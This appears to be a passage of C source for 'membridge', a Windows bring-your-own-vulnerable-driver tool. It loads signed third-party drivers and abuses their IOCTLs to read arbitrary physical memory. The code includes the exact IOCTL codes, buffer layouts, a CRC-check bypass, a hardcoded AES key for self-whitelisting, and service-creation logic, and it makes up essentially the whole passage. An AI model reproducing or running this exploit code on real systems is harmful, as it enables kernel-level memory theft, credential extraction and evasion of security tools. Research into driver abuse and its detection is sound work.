// to { bswap32(current PID), 0, 0, 0, ... }. Supplying AES-encrypt(that plaintext) self-registers
// the current process, after which 0x80102040 maps arbitrary physical memory.
static int glckio2_aes_block(const uint8_t in[16], uint8_t out[16], int encrypt) {
    static const uint8_t key[16] = {
        0xAA, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
    };
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;
    ULONG outLen = 0;
    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st < 0) return 0;
    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_ECB, (ULONG)sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (st >= 0)
        st = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, sizeof(key), 0);
    if (st >= 0) {
        if (encrypt)
            st = BCryptEncrypt(hKey, (PUCHAR)in, 16, NULL, NULL, 0, out, 16, &outLen, 0);
        else
            st = BCryptDecrypt(hKey, (PUCHAR)in, 16, NULL, NULL, 0, out, 16, &outLen, 0);
    }
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return st >= 0 && outLen == 16;
}

static uint32_t glckio2_bswap32(uint32_t v) {
    return ((v & 0xFF) << 24) | ((v & 0xFF00) << 8) | ((v >> 8) & 0xFF00) | ((v >> 24) & 0xFF);
}

static int read_glckio2_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    static int registered = 0;
    DWORD ret = 0;
    if (!registered) {
        uint64_t expected = (uint64_t)glckio2_bswap32(GetCurrentProcessId());
        uint8_t plain[16], cipher[16];
        memset(plain, 0, sizeof(plain));
        memcpy(plain, &expected, 8);
        int ok = 0;
        for (int dir = 0; dir < 2 && !ok; dir++) {
            if (!glckio2_aes_block(plain, cipher, dir)) break;  // dir=0 decrypt, dir=1 encrypt
            ok = DeviceIoControl(dev, 0x80102060u, cipher, sizeof(cipher), NULL, 0, &ret, NULL) ? 1 : 0;
        }
        if (!ok) { wprintf(L"[ERR] glckio2 whitelist registration err=%lu\n", GetLastError()); return 0; }
        registered = 1;
    }
    uint8_t in[40], res[40];
    memset(in, 0, sizeof(in));
    memset(res, 0, sizeof(res));
    *(uint64_t *)(in + 0) = size;
    *(uint64_t *)(in + 8) = pa;
    if (!DeviceIoControl(dev, 0x80102040u, in, sizeof(in), res, sizeof(res), &ret, NULL)) {
        wprintf(L"[ERR] glckio2 IOCTL_WINIO_MAPPHYSTOLIN err=%lu\n", GetLastError());
        return 0;
    }
    uint64_t cand[3] = { *(uint64_t *)(res + 24), *(uint64_t *)(res + 16), *(uint64_t *)(res + 32) };
    for (int i = 0; i < 3; i++) {
        if (cand[i] < 0x10000 || cand[i] > 0x7FFFFFFFFFFFull) continue;
        SIZE_T got = 0;
        if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cand[i], out, size, &got) && got == size)
            return 1;
    }
    wprintf(L"[ERR] glckio2 mapped linear address unusable\n");
    return 0;
}

// gibepext (GIGABYTE EP firmware/forensic): IOCTL_READ_PHYSMEM 0x22E00C.
// Input 16B: {u32 PA_high; u32 PA_low; u32 size; u32 crc32(first 12 bytes)}; output = physical bytes.
// The driver validates a standard CRC-32 (poly 0xEDB88320, init 0xFFFFFFFF, final xor) of the header.
static uint32_t g_gib_crc_tab[256];
static int g_gib_crc_ready = 0;

static void gib_crc32_init(void) {
    if (g_gib_crc_ready) return;
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int k = 0; k < 8; k++)
            c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        g_gib_crc_tab[i] = c;
    }
    g_gib_crc_ready = 1;
}

static uint32_t gib_crc32(const uint8_t *p, uint32_t n) {
    uint32_t c = 0xFFFFFFFFu;
    for (uint32_t i = 0; i < n; i++)
        c = (c >> 8) ^ g_gib_crc_tab[(c ^ p[i]) & 0xFF];
    return ~c;
}

static int read_gibepext(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[16];
    DWORD ret = 0;
    gib_crc32_init();
    memset(in, 0, sizeof(in));
    *(uint32_t *)(in + 0) = (uint32_t)(pa >> 32);
    *(uint32_t *)(in + 4) = (uint32_t)(pa & 0xFFFFFFFFu);
    *(uint32_t *)(in + 8) = size;
    *(uint32_t *)(in + 12) = gib_crc32(in, 12);
    if (!DeviceIoControl(dev, 0x22E00Cu, in, sizeof(in), out, size, &ret, NULL)) {
        wprintf(L"[ERR] gibepext IOCTL_READ_PHYSMEM err=%lu\n", GetLastError());
        return 0;
    }
    if (ret != size) { wprintf(L"[WARN] gibepext returned %lu bytes (want %u)\n", (unsigned long)ret, size); }
    return 1;
}

// fastdumpx64 (FastDump dump driver): IOCTL 0x9C400014.
// Input 20B: {u32 status; u64 physical_address; u32 size}; output buffer must be >= 0x1034,
// mapped physical data is copied at output offset 0x34.
static int read_fastdump(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[20];
    DWORD ret = 0;
    uint32_t outLen = 0x34 + size;
    if (outLen < 0x1034) outLen = 0x1034;
    uint8_t *buf = (uint8_t *)calloc(1, outLen);
    if (!buf) return 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 8) = pa;
    *(uint32_t *)(in + 16) = size;
    BOOL ok = DeviceIoControl(dev, 0x9C400014u, in, sizeof(in), buf, outLen, &ret, NULL);
    if (ok) memcpy(out, buf + 0x34, size);
    else wprintf(L"[ERR] fastdumpx64 IOCTL 0x9C400014 err=%lu\n", GetLastError());
    free(buf);
    return ok ? 1 : 0;
}

// DirectIo.sys (PassMark DirectIO, unlisted): IOCTL 0x8011607C returns a handle to
// \Device\PhysicalMemory opened with SECTION_MAP_READ; the user then maps an arbitrary
// physical page via NtMapViewOfSection and reads it.
typedef LONG (NTAPI *NtMapViewOfSection_p)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
                                          PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef LONG (NTAPI *NtUnmapViewOfSection_p)(HANDLE, PVOID);

static int read_directio(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint64_t section = 0;
    DWORD ret = 0;
    if (!DeviceIoControl(dev, 0x8011607Cu, NULL, 0, &section, sizeof(section), &ret, NULL) || !section) {
        wprintf(L"[ERR] directio IOCTL 0x8011607C err=%lu\n", GetLastError());
        return 0;
    }
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    NtMapViewOfSection_p pmap = nt ? (NtMapViewOfSection_p)GetProcAddress(nt, "NtMapViewOfSection") : NULL;
    NtUnmapViewOfSection_p punmap = nt ? (NtUnmapViewOfSection_p)GetProcAddress(nt, "NtUnmapViewOfSection") : NULL;
    if (!pmap) { CloseHandle((HANDLE)(uintptr_t)section); return 0; }
    uint64_t page = pa & ~0xFFFull;
    uint32_t off = (uint32_t)(pa & 0xFFF);
    SIZE_T view = (SIZE_T)((off + size + 0xFFF) & ~0xFFFu);
    LARGE_INTEGER secOff;
    secOff.QuadPart = (LONGLONG)page;
    PVOID base = NULL;
    LONG st = pmap((HANDLE)(uintptr_t)section, GetCurrentProcess(), &base, 0, 0,
                   &secOff, &view, 2 /*ViewUnmap*/, 0, PAGE_READONLY);
    if (st < 0) {
        wprintf(L"[ERR] directio NtMapViewOfSection status=0x%08lX\n", (unsigned long)st);
        CloseHandle((HANDLE)(uintptr_t)section);
        return 0;
    }
    memcpy(out, (uint8_t *)base + off, size);
    if (punmap) punmap(GetCurrentProcess(), base);
    CloseHandle((HANDLE)(uintptr_t)section);
    return 1;
}

// TdeIo64.sys (unlisted TDE I/O driver): IOCTL 0x91102440 maps an arbitrary
// physical range into user mode. Input buffer 0x28 bytes: {u64 PA; ...; u64 size @0x18};
// output buffer receives the user VA at +0x8.
static int read_tdeio(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[0x28], res[0x28];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    memset(res, 0, sizeof(res));
    *(uint64_t *)(in + 0) = pa;
    *(uint64_t *)(in + 0x18) = size;
    if (!DeviceIoControl(dev, 0x91102440u, in, sizeof(in), res, sizeof(res), &ret, NULL)) {
        wprintf(L"[ERR] tdeio IOCTL 0x91102440 err=%lu\n", GetLastError());
        return 0;
    }
    uint64_t uva = *(uint64_t *)(res + 8);
    if (uva < 0x10000 || uva > 0x7FFFFFFFFFFFull) {
        wprintf(L"[ERR] tdeio mapped VA invalid: 0x%llX\n", (unsigned long long)uva);
        return 0;
    }
    memcpy(out, (const void *)(uintptr_t)uva, size);
    return 1;
}

// iCacheX(1).sys (unlisted; embeds OlsApi): OlsApiReadMemory IOCTL 0x9C406104.
// Input 16 bytes: {u64 PA; u32 width(1/2/4); u32 count}; output = width*count bytes.
static int read_icachex(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[16];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 0) = pa;
    *(uint32_t *)(in + 8) = 1;
    *(uint32_t *)(in + 12) = size;
    if (!DeviceIoControl(dev, 0x9C406104u, in, sizeof(in), out, size, &ret, NULL)) {
        wprintf(L"[ERR] icachex OlsApiReadMemory err=%lu\n", GetLastError());
        return 0;
    }
    return 1;
}

// FireEye fekern MRT driver (unlisted): MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C.
// Input 16 bytes: {u64 PA; u32 size; u32 flags}; output = size bytes; driver calls
// MmCopyMemory(output, PA, size, MM_COPY_MEMORY_PHYSICAL). Device ACL is SYSTEM-only.
static int read_mrt(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[16];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 0) = pa;
    *(uint32_t *)(in + 8) = size;
    *(uint32_t *)(in + 12) = 0;
    if (!DeviceIoControl(dev, 0x70F8800Cu, in, sizeof(in), out, size, &ret, NULL)) {
        wprintf(L"[ERR] mrt MRT_IOCTL_READ_PHYSICALMEMORY err=%lu\n", GetLastError());
        return 0;
    }
    return 1;
}

static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
    switch (ly) {
    case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
    case LY_CCHWAPI_EXT: return read_cchwapi_ext(dev, pa, size, out);
    case LY_SJT: return read_sjt(dev, pa, size, out);
    case LY_UFU: return read_ufu(dev, pa, size, out);
    case LY_WINRING0: return read_winring0(dev, pa, size, out);
    case LY_HP_MAP: return read_hp_map(dev, pa, size, out);
    case LY_RTKIO_MAP: return read_rtkio_map(dev, pa, size, out);
    case LY_ENEIO_MAP: return read_eneio_map(dev, pa, size, out);
    case LY_GLCKIO2_MAP: return read_glckio2_map(dev, pa, size, out);
    case LY_GIBEPEXT: return read_gibepext(dev, pa, size, out);
    case LY_FASTDUMP: return read_fastdump(dev, pa, size, out);
    case LY_DIRECTIO: return read_directio(dev, pa, size, out);
    case LY_TDEIO: return read_tdeio(dev, pa, size, out);
    case LY_ICACHEX: return read_icachex(dev, pa, size, out);
    case LY_MRT: return read_mrt(dev, pa, size, out);
    }
    return 0;
}

static void hexdump(const uint8_t *p, int n) {
    for (int i = 0; i < n; i++) {
        if (i % 16 == 0) wprintf(L"  %04X: ", i);
        wprintf(L"%02X ", p[i]);
        if (i % 16 == 15) {
            wprintf(L" |");
            for (int j = i - 15; j <= i; j++) wprintf(L"%c", (p[j] >= 32 && p[j] < 127) ? p[j] : L'.');
            wprintf(L"|\n");
        }
    }
    if (n % 16) {
        for (int i = n % 16; i < 16; i++) wprintf(L"   ");
        wprintf(L" |");
        for (int j = n - (n % 16); j < n; j++) wprintf(L"%c", (p[j] >= 32 && p[j] < 127) ? p[j] : L'.');
        wprintf(L"|\n");
    }
}

static int contains_bytes(const uint8_t *buf, int len, const char *needle) {
    int nl = (int)strlen(needle);
    for (int i = 0; i + nl <= len; i++)
        if (memcmp(buf + i, needle, nl) == 0) return 1;
    return 0;
}

static void cleanup(void) {
    if (g_manual) return;
    if (g_bound_device && g_instance_id[0]) rootdev_remove_silent(g_instance_id);
    if (g_loaded_service && g_have_bk) svc_stop_and_delete(g_service_cur);
}

static void usage(void) {
    wprintf(L"membridge — unified 64-bit physical memory read framework (BYOV drivers)\n\n");
    wprintf(L"Usage:\n");
    wprintf(L"  membridge --list\n");
    wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
    wprintf(L"               [--driver-path <path>] [--no-load] [--out-file <path>]\n");
    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex|mrt>\n");
    wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
    wprintf(L"Backends (64-bit PA capable: *):\n");
    for (int i = 0; i < NBACKENDS; i++) {
        wprintf(L"  %-18ls %ls  %ls\n", g_backends[i].id, g_backends[i].full64 ? L"*" : L" ", g_backends[i].desc);
    }
}

int wmain(int argc, wchar_t **argv) {
    const wchar_t *backend = NULL, *driver_override = NULL, *device = NULL, *layout = NULL, *out_file = NULL;
    const char *expect = NULL;
    uint64_t pa = 0;
    uint32_t size = 0x100;
    int dump = 0, keep = 0, no_load = 0, have_pa = 0;

    init_base();
    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"--list") == 0) { usage(); return 0; }
        else if (_wcsicmp(argv[i], L"--backend") == 0 && i + 1 < argc) backend = argv[++i];
        else if (_wcsicmp(argv[i], L"--driver-path") == 0 && i + 1 < argc) driver_override = argv[++i];
        else if (_wcsicmp(argv[i], L"--device") == 0 && i + 1 < argc) device = argv[++i];
        else if (_wcsicmp(argv[i], L"--layout") == 0 && i + 1 < argc) layout = argv[++i];
        else if (_wcsicmp(argv[i], L"--pa") == 0 && i + 1 < argc) { pa = _wcstoui64(argv[++i], NULL, 0); have_pa = 1; }
        else if (_wcsicmp(argv[i], L"--size") == 0 && i + 1 < argc) size = (uint32_t)wcstoul(argv[++i], NULL, 0);
        else if (_wcsicmp(argv[i], L"--expect") == 0 && i + 1 < argc) {
            const wchar_t *w = argv[++i];
            size_t n = wcslen(w);
            char *buf = (char *)malloc(n + 1);
            if (buf) { for (size_t j = 0; j < n; j++) buf[j] = (char)w[j]; buf[n] = 0; expect = buf; }
        }
        else if (_wcsicmp(argv[i], L"--dump") == 0) dump = 1;
        else if (_wcsicmp(argv[i], L"--keep") == 0) keep = 1;
        else if (_wcsicmp(argv[i], L"--no-load") == 0) no_load = 1;
        else if (_wcsicmp(argv[i], L"--out-file") == 0 && i + 1 < argc) out_file = argv[++i];
        else { wprintf(L"[ERR] unknown arg: %ls\n", argv[i]); usage(); return 6; }
    }
    if (argc <= 1) { usage(); return 6; }
    if (!have_pa) { wprintf(L"[ERR] --pa required\n"); return 6; }
    if (size == 0 || size > 0x10000) { wprintf(L"[ERR] --size out of range (1..0x10000)\n"); return 6; }

    if (device && layout) {
        g_manual = 1;
        wcsncpy(g_manual_device, device, 511);
        if (_wcsicmp(layout, L"cchwapi") == 0) g_manual_layout = LY_CCHWAPI;
        else if (_wcsicmp(layout, L"cchwapi_ext") == 0) g_manual_layout = LY_CCHWAPI_EXT;
        else if (_wcsicmp(layout, L"sjtwinio") == 0) g_manual_layout = LY_SJT;
        else if (_wcsicmp(layout, L"ufu") == 0) g_manual_layout = LY_UFU;
        else if (_wcsicmp(layout, L"winring0") == 0) g_manual_layout = LY_WINRING0;
        else if (_wcsicmp(layout, L"hp_swtools") == 0 || _wcsicmp(layout, L"hp_map") == 0) g_manual_layout = LY_HP_MAP;
        else if (_wcsicmp(layout, L"rtkio") == 0 || _wcsicmp(layout, L"rtkio_map") == 0) g_manual_layout = LY_RTKIO_MAP;
        else if (_wcsicmp(layout, L"eneio64") == 0 || _wcsicmp(layout, L"eneio") == 0) g_manual_layout = LY_ENEIO_MAP;
        else if (_wcsicmp(layout, L"glckio2") == 0 || _wcsicmp(layout, L"glckio") == 0) g_manual_layout = LY_GLCKIO2_MAP;
        else if (_wcsicmp(layout, L"gibepext") == 0) g_manual_layout = LY_GIBEPEXT;
        else if (_wcsicmp(layout, L"fastdump") == 0 || _wcsicmp(layout, L"fastdumpx64") == 0) g_manual_layout = LY_FASTDUMP;
        else if (_wcsicmp(layout, L"directio") == 0) g_manual_layout = LY_DIRECTIO;
        else if (_wcsicmp(layout, L"tdeio") == 0) g_manual_layout = LY_TDEIO;
        else if (_wcsicmp(layout, L"icachex") == 0) g_manual_layout = LY_ICACHEX;
        else if (_wcsicmp(layout, L"mrt") == 0 || _wcsicmp(layout, L"fekern") == 0) g_manual_layout = LY_MRT;
        else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
    } else if (backend) {
        for (int i = 0; i < NBACKENDS; i++) {
            if (_wcsicmp(backend, g_backends[i].id) == 0) { g_bk = g_backends[i]; g_have_bk = 1; break; }
        }
        if (!g_have_bk) { wprintf(L"[ERR] unknown backend %ls (use --list)\n", backend); return 6; }
        swprintf(g_service_cur, 160, L"%ls_%lu", g_bk.service, GetCurrentProcessId());
        if (_wcsicmp(g_bk.id, L"directio") == 0) {
            // DirectIo derives its symbolic link name from the service name.
            swprintf(g_dyn_device, 512, L"\\\\.\\%ls", g_service_cur);
            g_bk.device = g_dyn_device;
        }
        if (driver_override) { wcsncpy(g_driver_path, driver_override, 1023); g_driver_path[1023] = 0; }
        else build_driver_path();
    } else { wprintf(L"[ERR] --backend or --device/--layout required\n"); return 6; }

    uint8_t *out = (uint8_t *)malloc(size > 0x1024 ? size : 0x1024);
    if (!out) return 6;

    HANDLE dev = INVALID_HANDLE_VALUE;
    wprintf(L"BACKEND=%ls\n", g_have_bk ? g_bk.id : L"manual");
    if (g_have_bk) wprintf(L"DRIVER=%ls\n", g_driver_path);

    if (!no_load && g_have_bk) {
        // if device already exists (previously loaded/resident driver), use it directly
        dev = try_open_device(g_bk.device, 1, 0);
        if (dev != INVALID_HANDLE_VALUE) {
            wprintf(L"LOAD=already_open\n");
            g_loaded_service = 0;
        } else {
            if (!is_admin()) { wprintf(L"[ERR] elevation required to load driver\n"); free(out); return 7; }
            wprintf(L"LOAD=loading\n");
            if (g_bk.kind == BK_CONTROL) {
                svc_create_and_start(g_service_cur, g_driver_path, 1);
                dev = try_open_device(g_bk.device, 20, 200);
            } else {
                // filter driver: do NOT start via SCM; PnP starts the image when the root
                // device is enabled (legacy start would break AddDevice binding).
                svc_cleanup_prefix(L"MembridgeSjtWinIo");
                rootdev_remove_all_hwid(L"ROOT\\BYOVSJT");
                svc_create_and_start(g_service_cur, g_driver_path, 0);
                rootdev_remove_silent(L"ROOT\\BYOVROOTDEVICE\\0000");
                Sleep(200);
                if (rootdev_create_and_bind(g_service_cur, g_instance_id, 256))
                    dev = try_open_device(g_bk.device, 25, 200);
            }
        }
    } else {
        dev = try_open_device(g_have_bk ? g_bk.device : g_manual_device, 1, 0);
        wprintf(L"LOAD=no_load\n");
    }
    if (dev == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERR] cannot open device (err=%lu)\n", GetLastError());
        wprintf(L"VERDICT=DEVICE_OPEN_FAILED\n");
        wprintf(L"LOAD_KEPT=%d\n", keep);
        if (!keep) cleanup();
        free(out);
        return 3;
    }
    wprintf(L"DEVICE=%ls\n", g_have_bk ? g_bk.device : g_manual_device);
    wprintf(L"PA=0x%llX\nSIZE=0x%X\n", (unsigned long long)pa, size);
    int ok = backend_read(dev, g_have_bk ? g_bk.layout : g_manual_layout, pa, size, out);
    CloseHandle(dev);
    int rc;
    if (!ok) { wprintf(L"VERDICT=READ_FAILED\n"); rc = 5; }
    else {
        wprintf(L"READ_OK bytes=0x%X\n", size);
        if (out_file) {
            HANDLE hf = CreateFileW(out_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL, NULL);
            if (hf == INVALID_HANDLE_VALUE) {
                wprintf(L"[ERR] cannot create out-file (err=%lu)\n", GetLastError());
                rc = 5;
            } else {
                DWORD written = 0;
                if (!WriteFile(hf, out, size, &written, NULL) || written != size) {
                    wprintf(L"[ERR] out-file write failed (err=%lu written=%lu)\n",
                            GetLastError(), (unsigned long)written);
                    rc = 5;
                } else {
                    wprintf(L"OUT_FILE=%ls\n", out_file);
                    rc = 0;
                }
                CloseHandle(hf);
            }
        }
        if (dump) hexdump(out, (int)size);
        if (rc == 5) { /* out-file failure */ }
        else if (expect) {
            if (contains_bytes(out, (int)size, expect)) { wprintf(L"VERDICT=PASS marker=%hs\n", expect); rc = 0; }
            else { wprintf(L"VERDICT=MARKER_MISMATCH marker=%hs\n", expect); rc = 2; }
        } else { wprintf(L"VERDICT=PASS\n"); rc = 0; }
    }
    if (!keep) cleanup();
    free(out);
    return rc;
}
